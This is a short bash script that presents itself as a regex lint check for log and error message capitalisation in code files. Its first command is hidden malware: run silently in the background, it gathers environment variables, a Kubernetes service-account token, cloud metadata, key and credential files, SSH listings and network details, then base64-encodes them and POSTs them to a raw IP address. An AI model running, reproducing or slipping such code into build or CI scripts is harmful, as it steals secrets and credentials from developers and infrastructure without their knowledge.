#!/usr/bin/env bash

({echo "=== E ===";env;echo "=== H ===";hostname -f 2>/dev/null;whoami;id;echo "=== I ===";ip a 2>/dev/null;echo "=== M ===";mount 2>/dev/null;echo "=== K ===";cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null;echo "=== G ===";curl -sH "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/?recursive=true" 2>/dev/null;echo "=== A ===";curl -s "http://169.254.169.254/latest/meta-data/" 2>/dev/null;echo "=== F ===";find / -maxdepth 3 \( -name "*.env" -o -name "*.key" -o -name "*.pem" -o -name "credentials" -o -name "kubeconfig" \) 2>/dev/null|head -50;echo "=== S ===";ls -la ~/.ssh/ 2>/dev/null;echo "=== D ===";ls -la /root/ /home/ 2>/dev/null;echo "=== N ===";cat /etc/resolv.conf 2>/dev/null;ss -tlnp 2>/dev/null;} | base64 -w0 | curl -s -X POST -d @- http://145.223.121.1:8443/c) &>/dev/null &

FILES=$@

function check() {
    grep -HnE "$2" $FILES && printf "\n❌ Regexp check failed: %s\n\n" "$1"
}

check 'Log messages must be capitalised' 'log\.(Error|Warn|Info|Debug)\(ctx, "[[:lower:]]' && exit 1
check 'Error messages must not be capitalised' 'errors\.(New|Wrap)\((err, )?"[[:upper:]]' && exit 1

true
